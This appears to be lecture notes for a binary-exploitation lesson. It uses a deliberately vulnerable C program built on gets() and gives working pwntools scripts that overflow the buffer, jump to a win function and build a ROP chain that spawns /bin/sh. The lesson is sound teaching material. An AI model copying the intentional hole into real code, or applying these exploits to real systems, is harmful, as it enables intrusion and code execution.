Example 2 (30 min): Buffer overflow to win function and win2(int arg) function. win2 requires arguments and some rop

# PWN Example 02

This next example will demonstrate how to exploit a buffer overflow to hijack the control flow of a program. There are no obvious variables to overwrite, yet an attacker can still call execute code that there is no path to execute.

## Explain example, show vulnerability

```c
#include<stdio.h>
#include<stdlib.h>

void win1() {
    printf("You win! Now try to use this program to call /bin/sh");
}

void win2(char * arg) {
    system(arg);
}

void main() {
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    char buffer[16];
     
    gets(buffer);
}
```

This example is quite simple, only four lines of code are executed, only one of which operates on your input. If we look at the man page for `gets` using either `man gets` or `man 2 gets`, we notice a section called `BUGS`:
```
Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
```

## Stack Frame Refresher

Let us remember what a stack frame looks like:
```
--------------------------------
|                              |
|        Local Variables       |
|                              |
--------------------------------
|  Saved Stack Frame Pointer   |
--------------------------------
|        Return Address        |
--------------------------------
```

When a function returns, it will restore the stack pointer (`rsp` on 64 bit) to the saved value, then jump to the return address, the address that the function was first called at. Under normal conditions, this means that execution will continue as expected. However, if one of the local variables can be overflown, the return address can be overwritten, allowing the attacker to choose at which address execution should continue at.

## Hijacking Control Flow by Overwriting the return address (AAAA; then win1). GDB Via Pwntools

We can attempt to overwrite the return address to the address of `win1`, but first, we will demonstrate how to debug a program via pwntools. The function `gdb.attach` will open gdb and connect to the existing process.

Before debugging with gdb, `context.terminal` must be set correctly. One option is to run in `tmux`, and use `['tmux' 'splitw', '-h']`. Otherwise, you will want to set context.terminal to a command that will open a new terminal with the following arguments as the command that the new terminal should run.

Pwntools will run `tmux splitw -h 'gdb command to connect to process'`.

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = process('./example02')
gdb.attach(p, """
    # Optional GDB commands to run when connecting
""")

p.interactive()
```

GDB will automatically break, so if we continue, and send an input of `AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEE` to attempt to overwrite the return pointer.

```
→   0x4011ca <main+87>        ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "example02", stopped 0x4011ca in main (), reason: SIGSEGV
```

The probram stopped because of a SIGSEGV, or segmentation fault. This occurs when the program attempts to access inaccessible memory. In our case, this is happening because the program is attempting to jump to a corrupted return address.

We can see what address the program is trying to jump to by printing the top item on the stack:
```
gef➤  x/xg $rsp
0x7ffc956749d8: 0x4444444444444444
```

`0x4444444444444444` is `DDDDDDDD`, so if we send 24 characters, followed by the address we wish to jump to, we should be able to cause the program to jump to a target address. To figure out which address to jump to, we can simply use gdb to print the address of `win1`. Ghidra, Binary Ninja, and other disassembly tools will also display the address.

```
gef➤  p win1
$1 = {<text variable, no debug info>} 0x401142 <win1>
```

```python
from pwn import *

p = process('./example02')
p.sendline(b'A' * 24 + p64(0x401142))
p.interactive()
```

Again, pwntools has some awesome features to help make this even easier. Instead of printing the address of win1 from gdb, we can use pwntools to extract it from the binary:

```python
from pwn import *

p = process('./example02')
binary = ELF('./example02')
p.sendline(b'A' * 24 + p64(binary.symbols['win1']))
p.interactive()
```

## Return Oriented Programming Explanation

The next task for us is to call `win2`. We can jump to its address easily, but it is a function that requires an argument. We will need to use a technique called "ROP" or "Return Oriented Programming" to set up the arguments. The way ROP works is by executing small snippets of code that are available in the binary. In x86, because instructions are variable length, we can even access snippets of code that were never intended to exist. These snippets are called 'gadgets.' We want gadgets that end with a `ret` instruction, so that the next argument on the stack will be executed.

If we have a buffer overflow, and overwrite the return address and beyond, we can make the stack look something like:
```
address_of_gadget_1 <-- return address
address_of_gadget_2
address_of_gadget_3
```

Then when `gadget_1` returns, the next gadget will be jumped to.

More practically an example of a gadget might be `pop rdi; ret`, which is quite short and commonly found in binaries. In hex, that is: `5fc3`. `5f` assembles to `pop rdi`, and `c3` assembles to `ret`.

If you remember from the RE lessons, in 64-bit x86, arguments are passed by register, and `rdi` is the register where the first argument is stored. This means that if we have a `pop rdi; ret` gadget, we can control the argument to the `win2` function.

## ROPGadget

A useful tool to find gadgets in a binary is `ROPGadget`. There are many similar tools, such as `ropper`, and sometimes they pick up different gadgets. Even pwntools has utilities to find gadgets, which we will demonstrate shortly. Feel free to experiment and discover what you like best.

```
━━┫ ROPGadget --binary example02
Gadgets information                                                                                                                                                                                                            
============================================================                                                                                                                                                                   
0x00000000004010b8 : adc byte ptr [rax + 0x40], al ; add bh, bh ; loopne 0x40112d ; nop ; ret
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401024
0x000000000040114f : add al, ch ; jmp 0x401153
0x00000000004010bb : add bh, bh ; loopne 0x40112a ; nop ;ret
0x000000000040114d : add byte ptr [rax], al ; add al, ch ; jmp 0x401155
...
A lot more gadgets
```

As binaries have tons of gadgets, and as they get larger, the list of gadgets grow longer, ROPGadget and similar tools have search functionalities. In our case, however, a simple `grep` will do.
```
━━┫ ROPgadget --binary example02 | grep 'pop rdi'
0x000000000040122b : pop rdi ; ret
```

We can also use pwntools to perform a similar functionality

```python
━━┫ python
>>> from pwn import *
>>> rop = ROP('./example02')
[*] '/home/example02/example02'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
>>> rop.find_gadget(['pop rdi'])
Gadget(0x40122b, ['pop rdi', 'ret'], ['rdi'], 0x8)
```

While we are here, we can also get the address of `/bin/sh\x00`, which is convienently at the end of a string in the binary.
```python
>>> binary = ELF('./example02')
>>> hex(next(binary.search(b'/bin/sh\x00')))
'0x402035'
```

## Calling win2 and getting a shell

Now it is simply a matter of assembling our ropchain, which should look like:

```
0x40122b -  pop_rdi_ret
0x402035 -  ptr_to_bin_sh (which will be popped into rdi)
0x401158 -  win2
```

We can assemble this in pwntools:
```python3
from pwn import *

p = process('./example02')

ropchain = b''
ropchain += p64(0x40122b)  # pop rdi; ret
ropchain += p64(0x402035)  # "/bin/sh"
ropchain += p64(0x401158)  # win2

binary = ELF('./example02')
p.sendline(b'A' * 24 + ropchain)

p.interactive()
```

PERSONAL NOTE: STEP THROUGH SOLVE IN GDB

Again, pwntools can make this even easier for us. Here is an example of the use of more advanced pwntools utilities:
```python3
from pwn import *

p = process('./example02')
rop = ROP('./example02')
binary = ELF('./example02')

# Automatically finds and uses simple gadgets in to make a ropchain
rop.call('win2', [next(binary.search(b'/bin/sh\x00'))])
print(rop.dump())
ropchain = rop.chain()

p.sendline(b'A' * 24 + ropchain)

p.interactive()
```
